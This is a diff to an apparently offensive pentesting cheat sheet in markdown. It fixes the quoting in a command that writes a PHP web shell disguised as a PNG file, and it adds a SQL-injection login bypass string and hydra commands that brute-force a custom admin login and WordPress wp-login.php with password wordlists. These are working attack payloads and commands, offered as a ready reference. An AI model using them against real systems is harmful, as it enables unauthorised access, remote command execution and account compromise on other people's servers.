@@ -505,7 +505,7 @@ THINK ABOUT LOCAL FILE INCLUSION.
 
 ```bash
 echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
-echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
+echo "<?php system(\$_REQUEST['cmd']); ?>" >> mime_shell.php.png
 ```
 
 ```bash
@@ -800,6 +800,8 @@ Note that it sends the payload non-url-encoded.
 
 #### Bruteforcing Logins
 
+First try `admin' or '1'='1`
+
 Basic auth.
 
 ```bash
@@ -812,7 +814,13 @@ Popup Logins.
 hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip http-get
 ```
 
-Webapp Login Brute.
+Webapp Login Brute..
+
+If button..
+
+```bash
+hydra -l admin -P /usr/share/wordlists/combo.txt -f $ip -s 9443 https-post-form "/Admin/login.php:txtusername=^USER^&txtpassword=^PASS^&btnlogin=Sign+in:Wrong Username and Password"
+```
 
 ```bash
 # Third parameter can be F=html_content or S=html_content, F is inferred
@@ -836,6 +844,12 @@ cewl --lowercase http://$ip:8081/ -d 8| grep -v CeWL  >> custom-wordlist.txt
 # F=403 tells hydra that HTTP 403 means invalid login
 hydra -I -f -L usernames.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
 hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
+```
+
+Wordpress.
+
+```bash
+hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 ```
 
 #### Tomcat
